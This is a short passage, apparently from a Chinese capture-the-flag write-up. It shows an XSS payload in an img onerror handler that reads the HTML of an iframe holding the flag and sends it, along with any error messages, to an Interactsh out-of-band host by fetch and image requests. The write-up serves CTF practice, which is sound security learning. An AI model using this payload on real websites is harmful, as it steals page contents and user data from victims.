...
<img src=x onerror="
  // 2. 设置延时，给 iframe 里面的 JS 留出 2 秒钟去向后台拿数据并渲染 Flag
  setTimeout(function() {
    try {
        // 3. 窃取 iframe 里的所有 HTML (包含已经显示出来的 Flag)
        var stolenContent = document.getElementById('hack-frame').contentDocument.body.innerHTML;
        
        // 4. 发送到你的 Interactsh 新地址
        fetch('http://uwmheqzbqamiyvvpvwuple13wh74lp53p.oast.fun', {
            method: 'POST',
            mode: 'no-cors',
            body: stolenContent
        });
        ...
        // 报错回传
        new Image().src = 'http://uwmheqzbqamiyvvpvwuple13wh74lp53p.oast.fun/?error=' + e;
    }
  }, 2000); // 如果靶机卡顿，可以尝试把这里改成 3000 或 4000
">
```
页面源码反射
...
![](assets/绘马挂/file-20260204174238577.png)